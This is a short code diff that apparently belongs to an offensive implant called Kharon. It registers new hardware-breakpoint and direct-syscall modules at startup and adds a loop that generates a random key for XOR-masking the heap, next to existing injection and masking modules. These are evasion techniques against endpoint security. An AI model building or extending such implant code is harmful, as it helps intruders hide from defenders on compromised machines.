@@ -7,6 +7,8 @@ EXTERN_C DECLFN auto Main(
 ) -> VOID {
     Kharon Kh;
 
+    HwbpEng   KhHwbp( &Kh );
+    Syscall   KhSyscall( &Kh );
     Socket    KhSocket( &Kh );
     Jobs      KhJobs( &Kh );
     Useful    KhUseful( &Kh );
@@ -23,6 +25,8 @@ EXTERN_C DECLFN auto Main(
     Injection KhInjection( &Kh );
     Mask      KhMask( &Kh );
  
+    Kh.InitHwbp( &KhHwbp );
+    Kh.InitSyscall( &KhSyscall );
     Kh.InitSocket( &KhSocket );
     Kh.InitJobs( &KhJobs );
     Kh.InitUseful( &KhUseful );
@@ -115,6 +119,12 @@ auto DECLFN Kharon::Init(
 
     for ( INT i = 0; i < syLast -1; i++ ) {
         Sys->Fetch( i );
+    }
+
+    /* ========= [ key generation to xor heap ] ========= */
+
+    for ( INT i = 0; i < sizeof( Hp->Key ); i++ ) {
+        Hp->Key[i] = (BYTE)Rnd32();
     }
 
     /* ========= [ informations collection ] ========= */
